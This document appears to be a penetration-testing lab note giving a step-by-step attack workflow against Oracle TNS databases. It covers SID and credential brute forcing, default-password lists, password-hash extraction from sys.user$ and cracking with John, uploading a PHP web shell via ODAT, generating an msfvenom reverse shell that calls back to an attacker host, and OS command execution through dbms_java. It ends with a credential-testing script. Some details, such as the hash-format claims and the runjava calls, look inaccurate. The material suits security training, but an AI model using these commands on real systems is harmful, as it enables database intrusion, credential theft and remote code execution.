---
tags: [module/footprinting, oracle, tns, database, level/advanced, practical]
---

# Oracle TNS Enumeration - Practical Application

## Complete Oracle TNS Enumeration Workflow

Phase 1: Service Discovery
Phase 2: SID Enumeration
Phase 3: Credential Testing
Phase 4: Database Enumeration
Phase 5: Privilege Escalation
Phase 6: Password Hash Extraction
Phase 7: File Upload/Code Execution

---

## Phase 1: Service Discovery

### Nmap Basic Scan

nmap -p1521 -sV 10.129.204.235 --open

### Nmap Oracle Scripts

ls /usr/share/nmap/scripts/oracle-*

Key scripts:
- oracle-brute.nse - Brute force credentials
- oracle-enum-users.nse - Enumerate users
- oracle-sid-brute.nse - Brute force SIDs
- oracle-tns-version.nse - Get TNS version

### Comprehensive Oracle Scan

nmap -p1521 --script oracle-* 10.129.204.235 -oN oracle-nmap.txt

---

## Phase 2: SID Enumeration

### What is a SID?

SID (System Identifier) is a unique name that identifies a specific Oracle database instance. Clients must know the correct SID to connect.

### Nmap SID Brute Force

nmap --script oracle-sid-brute -p1521 10.129.204.235

Output:
| oracle-sid-brute: 
|_  XE

### Manual SID Guessing

Common SIDs:
- XE
- ORCL
- ORCLCDB
- ORCLPDB1
- ORCL12C
- ORCL19C
- ORCL11G
- DB01
- DB02
- PROD
- DEV
- TEST

### Using Hydra for SID Brute Force

hydra -L sids.txt -p dummy 10.129.204.235 oracle-sid

---

## Phase 3: Credential Testing

### Default Oracle Credentials

| Username | Password |
|----------|----------|
| sys | change_on_install |
| system | manager |
| dbsnmp | dbsnmp |
| scott | tiger |
| hr | hr |
| outln | outln |
| ctxsys | ctxsys |
| mdsys | mdsys |
| ordplugins | ordplugins |
| orddata | orddata |
| ordsys | ordsys |
| si_informtn_schema | si_informtn_schema |

### Using ODAT for Password Guessing

./odat.py passwordguesser -s 10.129.204.235 -d XE --accounts-file accounts.txt

### ODAT All Modules Scan

./odat.py all -s 10.129.204.235

This will:
- Test connections
- Guess SIDs
- Test credentials
- Check for vulnerabilities

### Example ODAT Output

[+] Valid credentials found: scott/tiger. Continue...

---

## Phase 4: Database Enumeration

### Connect with SQLPlus

sqlplus scott/tiger@10.129.204.235/XE

### Check Current User Privileges

SELECT * FROM user_role_privs;
SELECT * FROM session_privs;
SELECT * FROM user_sys_privs;

### List All Tables

SELECT table_name FROM all_tables;
SELECT table_name FROM dba_tables;

### List All Users

SELECT username FROM all_users;
SELECT username FROM dba_users;

### Get Database Version

SELECT * FROM v$version;
SELECT banner FROM v$version;

### List All Databases (Instances)

SELECT name, open_mode FROM v$database;
SELECT instance_name, status FROM v$instance;

### List All Roles

SELECT role FROM dba_roles;

### Check for DBA Privileges

SELECT * FROM v$pwfile_users;  -- Users with SYSDBA/SYSOPER

---

## Phase 5: Privilege Escalation

### Connect as SYSDBA

sqlplus scott/tiger@10.129.204.235/XE as sysdba

### Check SYSDBA Privileges

SELECT * FROM user_role_privs;
SELECT * FROM v$pwfile_users WHERE username = 'SYS';

### Create New User (if DBA)

CREATE USER pentest IDENTIFIED BY password;
GRANT CONNECT, RESOURCE, DBA TO pentest;

### Execute System Commands (if Java enabled)

EXEC dbms_java.runjava('org.apache.commons.io.FileUtils.writeStringToFile', '/tmp/test.txt', 'test');

---

## Phase 6: Password Hash Extraction

### Extract Hashes from sys.user$

SELECT name, password FROM sys.user$;

Output:
SYS                           FBA343E7D6C8BC9D
SYSTEM                        B5073FE1DE351687
OUTLN                         4A3BA55E08595C81
SCOTT                         4A3BA55E08595C81

### Crack Hashes with John

Save hashes to file (username:hash)
scott:4A3BA55E08595C81

john --format=oracle11 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

### Oracle 11g Hash Format

Oracle 11g uses SHA-1-based password hashes.

### Extract Password Policy

SELECT * FROM dba_profiles WHERE resource_name LIKE 'PASSWORD%';

---

## Phase 7: File Upload and Code Execution

### Check if UTL_FILE is Available

SELECT * FROM dba_directories;

### Create Test File

echo "Oracle File Upload Test" > testing.txt

### Upload File with ODAT

./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

### Upload to Linux Web Directory

./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile /var/www/html testing.txt ./testing.txt

### Upload PHP Web Shell

echo '<?php system($_GET["cmd"]); ?>' > shell.php
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile /var/www/html shell.php ./shell.php

### Access Uploaded File

curl http://10.129.204.235/shell.php\?cmd\=id

### Upload Reverse Shell (Windows)

Generate reverse shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o rev.exe

Upload:
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot rev.exe ./rev.exe

Execute via web or xp_cmdshell style.

---

## Oracle Java Execution

### Check if Java is Enabled

SELECT * FROM dba_java_policy;

### Execute Java Command

EXEC dbms_java.runjava('java.lang.Runtime.getRuntime().exec', 'cmd.exe /c whoami > C:\temp\output.txt');

### Read Output File with UTL_FILE

DECLARE
  file_handle UTL_FILE.FILE_TYPE;
  line VARCHAR2(32767);
BEGIN
  file_handle := UTL_FILE.FOPEN('C:\TEMP', 'output.txt', 'R');
  UTL_FILE.GET_LINE(file_handle, line);
  DBMS_OUTPUT.PUT_LINE(line);
  UTL_FILE.FCLOSE(file_handle);
END;
/

---

## Complete Oracle Enumeration Script

Save as oracle-enum.sh:

#!/bin/bash
HOST=$1
OUTPUT_DIR="oracle-enum-$HOST"
mkdir -p $OUTPUT_DIR

echo "[*] Starting Oracle TNS enumeration on $HOST"

echo "[*] Nmap scan..."
nmap -p1521 --script oracle-* -oN $OUTPUT_DIR/nmap.txt $HOST

echo "[*] SID brute force..."
nmap -p1521 --script oracle-sid-brute -oN $OUTPUT_DIR/sids.txt $HOST
SID=$(grep -o '^[A-Z0-9]\+' $OUTPUT_DIR/sids.txt | head -1)

if [ ! -z "$SID" ]; then
    echo "[*] Found SID: $SID"
    
    echo "[*] Testing default credentials..."
    echo "scott:tiger" >> $OUTPUT_DIR/creds.txt
    echo "dbsnmp:dbsnmp" >> $OUTPUT_DIR/creds.txt
    echo "system:manager" >> $OUTPUT_DIR/creds.txt
    
    for cred in $(cat $OUTPUT_DIR/creds.txt); do
        USER=$(echo $cred | cut -d: -f1)
        PASS=$(echo $cred | cut -d: -f2)
        echo "exit" | sqlplus $USER/$PASS@$HOST/$SID 2>&1 | grep -q "Connected to:" && echo "[+] Valid: $USER:$PASS"
    done
fi

echo "[*] Oracle enumeration complete. Check $OUTPUT_DIR/"

---

## Tool Comparison

| Tool | Purpose | Best For |
|------|---------|----------|
| sqlplus | Oracle client | Manual queries |
| ODAT | Comprehensive tool | All-in-one enumeration |
| Nmap scripts | SID brute force | Initial discovery |
| Hydra | Credential brute force | Password attacks |

---

## Key Oracle SIDs

| SID | Description |
|-----|-------------|
| XE | Express Edition |
| ORCL | Standard/Oracle Database |
| ORCLCDB | Container Database (12c+) |
| ORCLPDB1 | Pluggable Database (12c+) |
| DB01 | Custom naming |
| PROD | Production database |
| DEV | Development database |
| TEST | Test database |

---

## Key Takeaways

- Oracle TNS default port: 1521/tcp
- SIDs must be guessed or brute-forced
- Default credentials (scott:tiger) are common
- ODAT is the best tool for Oracle enumeration
- SYSDBA access gives full control
- Password hashes in sys.user$ can be cracked
- UTL_FILE can upload files if configured
- Java execution possible if Java is enabled
- File upload + web access = RCE
- Oracle often found in enterprise networks
- Always check for DBA privileges after login
